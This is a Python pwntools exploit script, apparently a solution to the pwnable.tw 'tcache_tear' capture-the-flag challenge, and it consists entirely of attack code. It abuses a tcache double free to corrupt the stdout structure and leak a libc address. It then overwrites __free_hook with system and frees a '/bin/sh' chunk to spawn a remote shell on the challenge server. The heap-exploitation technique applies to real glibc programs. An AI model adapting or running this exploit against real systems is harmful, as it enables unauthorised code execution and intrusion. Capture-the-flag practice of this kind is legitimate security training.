from pwn import *
elf = ELF("./tcache_tear")
libc = ELF("./libc")
ld = ELF("./ld-2.27.so")
context.binary=elf
target=remote('chall.pwnable.tw',10207)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def setup(name="A"):
	sa("Name:",name)

def add(size,data="A"):
	sla("choice :",str(1))
	sla("Size:",str(size))
	sa("Data:",data)
		
def free():
	sla("choice :",str(2))

stdout=0x602020
setup()
add(0x40)
free()
free()
add(0x40,p64(stdout))
add(0x40)
add(0x40,"\x60")
payload=p64(0xfbad1800)+p64(0)*3+b"\x00"
add(0x40,payload)
libc_base=u64(target.recv(16)[8:16])-0x3ed8b0
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
add(0x30)
free()
free()
add(0x30,p64(libc_free_hook))
add(0x30)
add(0x30,p64(libc_system))
add(0x20,"/bin/sh\x00")
free()
target.interactive()
